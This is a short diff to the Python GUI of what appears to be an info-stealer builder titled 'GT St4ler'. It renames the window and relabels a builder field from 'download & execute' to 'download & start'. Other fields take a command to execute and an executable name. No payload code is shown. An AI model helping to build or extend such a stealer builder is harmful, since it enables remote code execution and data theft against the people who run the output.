@@ -56,7 +56,7 @@ class Gui:
 
     dpg.create_context()
     dpg.create_viewport(
-        title="GT St4ler - bt08s",
+        title="GTSt4ler - bt08s",
         width=width,
         height=height,
         decorated=False,
@@ -107,7 +107,7 @@ class Gui:
         height=height,
         on_close=lambda: dpg.stop_dearpygui()) as window:
 
-        dpg.add_input_text(label="File url (download & execute)", hint="<optional>", tag="file_url")
+        dpg.add_input_text(label="File url (download & start)", hint="<optional>", tag="file_url")
         dpg.add_input_text(label="Cmd command (execute)", hint="<optional>", tag="command")
         
         dpg.add_input_text(label="Executable name", tag="executable_name")
